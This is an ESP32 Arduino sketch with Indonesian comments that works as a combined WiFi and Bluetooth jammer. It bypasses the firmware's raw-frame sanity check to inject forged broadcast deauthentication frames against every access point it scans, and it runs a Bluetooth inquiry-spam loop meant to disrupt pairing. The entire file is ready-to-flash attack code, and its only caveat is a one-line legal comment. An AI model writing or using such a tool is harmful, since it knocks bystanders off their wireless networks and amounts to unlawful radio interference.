// ESP32 WiFi + Bluetooth Jammer (classic ESP32 only, bukan S3/S2/C3/C6)
// WiFi: deauth broadcast ke semua AP yang discan
// BT: toggle controller + inquiry spam (mengganggu pairing/throughput)
// Legal: jamming RF butuh izin; gunakan di lingkungan sendiri.

#include <WiFi.h>
#include "esp_wifi.h"
#include "esp_bt.h"
#include "esp_bt_main.h"
#include "esp_gap_bt_api.h"

extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2) {
  return (arg == 0 && arg2 == 0) ? 1 : 0;  // linker hack agar esp_wifi_80211_tx ikut di-link
}
extern "C" int esp_wifi_80211_tx(void *wifi, void *packet, int len, bool sys_seq);

static const uint8_t DEAUTH_FRAME[] = {
  0xc0, 0x00, 0x00, 0x00,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff,  // dst broadcast
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // src
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // bssid
  0x00, 0x00,                          // seq
  0x07, 0x00                           // reason 7
};

static void sendDeauth(const uint8_t *bssid, uint8_t channel) {
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  uint8_t frame[26];
  memcpy(frame, DEAUTH_FRAME, 26);
  memcpy(&frame[10], bssid, 6);
  memcpy(&frame[16], bssid, 6);
  for (int i = 0; i < 10; i++) {
    esp_wifi_80211_tx(WIFI_IF_AP, frame, 26, false);
    delay(1);
  }
}

static void wifiJamTask(void *pv) {
  WiFi.mode(WIFI_AP_STA);
  WiFi.disconnect();
  esp_wifi_set_promiscuous(true);
  for (;;) {
    int n = WiFi.scanNetworks();
    for (int i = 0; i < n; i++) {
      sendDeauth(WiFi.BSSID(i), WiFi.channel(i));
      yield();
    }
    delay(50);
  }
}

// ponytail: inquiry+toggle menurunkan throughput BT; RF jamming murni butuh CC2500/nRF module.
static void btJamTask(void *pv) {
  esp_bt_controller_config_t cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
  esp_bt_controller_init(&cfg);
  esp_bt_controller_enable(ESP_BT_MODE_BTDM);  // WiFi+BT coexist
  esp_bluedroid_init();
  esp_bluedroid_enable();
  for (;;) {
    esp_bt_gap_start_discovery(ESP_BT_INQ_MODE_GENERAL_INQUIRY, 2, 0);
    delay(50);
    esp_bt_gap_cancel_discovery();
    delay(10);
  }
}

void setup() {
  Serial.begin(115200);
  xTaskCreatePinnedToCore(wifiJamTask, "wifiJam", 8192, NULL, 1, NULL, 0);
  xTaskCreatePinnedToCore(btJamTask, "btJam", 8192, NULL, 1, NULL, 1);
}

void loop() { vTaskDelete(NULL); }
